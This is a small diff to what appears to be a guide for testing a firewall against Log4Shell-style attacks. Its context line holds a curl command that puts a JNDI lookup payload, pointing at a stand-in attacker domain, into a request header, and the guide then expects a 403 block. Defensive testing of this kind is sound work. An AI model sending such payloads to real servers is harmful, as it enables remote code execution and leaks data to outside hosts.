@@ -215,7 +215,7 @@ curl -v -H 'User-Agent: ${jndi:dns://${SRV_IP.evildoer.xyz}' 'vr-dev.dev/$\{jndi
 ```
 - This time you should get a different http response as following
 
-``bash
+```bash
  HTTP/1.1 403 Forbidden
 ```
 
